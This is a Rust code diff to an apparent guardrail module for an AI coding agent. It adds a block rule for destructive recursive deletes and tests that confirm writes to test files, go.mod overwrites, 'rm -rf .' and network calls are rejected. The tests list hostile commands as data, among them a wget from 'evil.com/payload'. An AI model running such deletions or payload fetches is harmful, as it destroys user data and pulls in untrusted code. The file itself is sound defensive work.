@@ -160,6 +160,42 @@ fn rule_6_no_dangerous_shell_commands(command: &str) -> Result<(), Violation> {
             });
         }
     }
+
+    // v9.3.0 evidence fix:
+    // Block destructive workspace wipes like `rm -rf .`, `rm -rf ..`, `rm -rf *`
+    let tokens: Vec<&str> = cmd.split_whitespace().collect();
+    if tokens.first() == Some(&"rm") {
+        let mut has_recursive = false;
+        let mut has_force = false;
+        let mut targets: Vec<&str> = Vec::new();
+
+        for token in tokens.iter().skip(1) {
+            match *token {
+                "-rf" | "-fr" => {
+                    has_recursive = true;
+                    has_force = true;
+                }
+                "-r" | "--recursive" => {
+                    has_recursive = true;
+                }
+                "-f" | "--force" => {
+                    has_force = true;
+                }
+                _ if token.starts_with('-') => {}
+                _ => targets.push(*token),
+            }
+        }
+
+        let dangerous_targets = [".", "./", "..", "../", "*", "~", "~/"];
+        if has_recursive && has_force && targets.iter().any(|t| dangerous_targets.contains(t)) {
+            return Err(Violation {
+                rule_id: 6,
+                rule_name: "no-dangerous-command",
+                detail: format!("dangerous shell command blocked: `{}`", command),
+            });
+        }
+    }
+
     Ok(())
 }
 
@@ -301,5 +337,67 @@ PROTOCOL RULES (mandatory in every plan):
         let s = rules_summary();
         assert!(s.contains("no-modify-tests"));
         assert!(s.contains("no-system-path"));
+    }
+
+    // ═══ Evidence Tests (Wave 1) ═══
+
+    #[test]
+    fn evidence_constitution_blocks_existing_test_modification() {
+        // Claim: Constitution Rule 1 prevents writing to existing test files
+        let path = PathBuf::from("tests/test_api.py");
+        let result = check_write(&path, "def test_new(): pass\n", true);
+        assert!(result.is_err());
+        let v = result.unwrap_err();
+        assert_eq!(v.rule_id, 1);
+        assert!(v.to_string().contains("CONSTITUTION_VIOLATION"));
+    }
+
+    #[test]
+    fn evidence_constitution_blocks_go_mod_overwrite() {
+        // Claim: Constitution Rule 5 prevents overwriting go.mod
+        let path = PathBuf::from("go.mod");
+        let result = check_write(&path, "module example\n\ngo 1.21\n", false);
+        assert!(result.is_err());
+        assert_eq!(result.unwrap_err().rule_id, 5);
+    }
+
+    #[test]
+    fn evidence_constitution_blocks_dangerous_rm_rf() {
+        // Claim: Constitution Rule 6 blocks destructive shell commands
+        assert!(check_command("rm -rf /tmp/project").is_err());
+        assert!(check_command("rm -rf .").is_err());
+    }
+
+    #[test]
+    fn evidence_constitution_blocks_network_in_test() {
+        // Claim: Constitution Rule 7 blocks network access during tests
+        assert!(check_command("curl https://api.example.com").is_err());
+        assert!(check_command("wget http://evil.com/payload").is_err());
+    }
+
+    #[test]
+    fn evidence_constitution_allows_safe_source_write() {
+        // Claim: Constitution does NOT block legitimate source file writes
+        let path = PathBuf::from("src/main.py");
+        assert!(check_write(&path, "def main():\n    print(\"hello\")\n", false).is_ok());
+    }
+
+    #[test]
+    fn evidence_constitution_allows_safe_test_commands() {
+        // Claim: Safe test commands are not blocked
+        assert!(check_command("cargo test").is_ok());
+        assert!(check_command("pytest tests/").is_ok());
+        assert!(check_command("go test ./...").is_ok());
+        assert!(check_command("npm test").is_ok());
+    }
+
+    #[test]
+    fn evidence_constitution_violation_contains_rule_name() {
+        // Claim: Violations carry rule_name for routing (used by ForceSourceOnly)
+        let path = PathBuf::from("test_main.py");
+        let result = check_write(&path, "test content", true);
+        let v = result.unwrap_err();
+        assert!(!v.rule_name.is_empty());
+        assert!(v.to_string().contains(v.rule_name));
     }
 }
